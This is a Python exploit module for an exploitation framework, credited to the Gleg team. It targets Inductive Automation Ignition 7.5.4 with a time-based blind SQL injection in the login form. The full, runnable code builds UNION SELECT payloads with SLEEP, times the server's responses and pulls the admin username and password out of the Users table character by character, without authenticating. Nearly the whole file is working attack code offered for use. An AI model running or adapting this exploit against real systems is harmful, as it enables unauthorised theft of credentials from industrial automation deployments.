from Sploit import Sploit
from collections import OrderedDict
import string
import urllib
import urllib2
import time

INFO = {}
INFO['NAME'] = "efs_inductive_automation_ignition_7_5_4_bSQLi"
INFO['DESCRIPTION'] = "Inductive Automation 7.5.4 time-based blind SQLi"
INFO['VENDOR'] = "https://inductiveautomation.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The specific flaw lies within authentication method based on storing credentials in the DB.
Insufficient input sanitization (no escaping of \\ and replacing ' with '') allows unauthenticated person to extract credentials from the DB using time-based blind SQLi.
This module was tested on default settings of "Database" authentication profile, but the application supports custom queries for data extraction.
The following module was tested on Windows 7 x64 and MySQL as the DB.
"""
INFO['DOWNLOAD_LINK'] = "https://inductiveautomation.com/downloads/ignition"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = "21 Nov 2018, Gleg team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.56.101", dict(description='Target host')
OPTIONS["PORT"] = 8088, dict(description='Target port')
OPTIONS["BASEPATH"] = '/'
OPTIONS["SSL"] = False, dict(description='Use SSL?')
OPTIONS["DELAY"] = 0.9, dict(description='Amount of time for the DB to sleep. Lesser values will speed up extraction but may also trigger false positives')
OPTIONS["USERNAME"] = 'admin', dict(description='Password of this user will be extracted')

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8088
        self.protocol = 'http'
        self.delay = 1
        self.sqli = "\\' UNION SELECT IF (SUBSTRING(CONCAT(Username, CHAR(58), Password), {POSITION}, 1)=CHAR({CHARCODE}), SLEEP({DELAY}), ') FROM Users WHERE Username = CONCAT({USERNAME});#"
        self.charpool = string.printable[:-6]
       	self.username = 'admin'
       	self.basepath = '/'

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.protocol = 'https' if self.args.get("SSL", False) else 'http'
        self.username = self.args.get("USERNAME", self.username)
        self.delay = float(self.args.get("DELAY", self.delay))

        self.basepath = self.args.get("BASEPATH", self.basepath)
        if self.basepath == '/':
        	self.basepath = ''
        else:
        	self.basepath = '/' + self.basepath.strip('/')

        self.url = '{}://{}:{}{}/main/web/login/wicket:interface/:170:signInForm::IFormSubmitListener::'.format(self.protocol, self.host, self.port, self.basepath)

    def guess_letter(self, pos):
    	for letter in self.charpool:
    		data = {
	    	'username': self.sqli.format(POSITION=pos, CHARCODE=ord(letter), DELAY=self.delay, USERNAME=self.encode_username(self.username)),
	    	'password': '1',
	    	'login': 'Login',
	    	'id2442_hf_0': ''
    		}
    		data = urllib.urlencode(data)
    		start = time.time()
    		urllib2.urlopen(self.url, data)
    		if time.time() - start >= self.delay:
    			return letter

    	return None

    def encode_username(self, username):
    	res = ''
    	for letter in username:
    		res += 'CHAR({}), '.format(ord(letter))
    	return res.strip(', ')
        

    def run(self):
        #Get options from gui
        self.args()
        self.log('Beginning extraction...')
        res, i = '', 1
        cur = self.guess_letter(i)

        while cur:
        	res += cur
        	i += 1
        	cur = self.guess_letter(i)
        	self.log('Current result: {}'.format(res))

        if res:
        	self.log('Final result: {}'.format(res))
        	self.finish(True)
        else:
        	self.log('Failed to extract data...')
        	self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
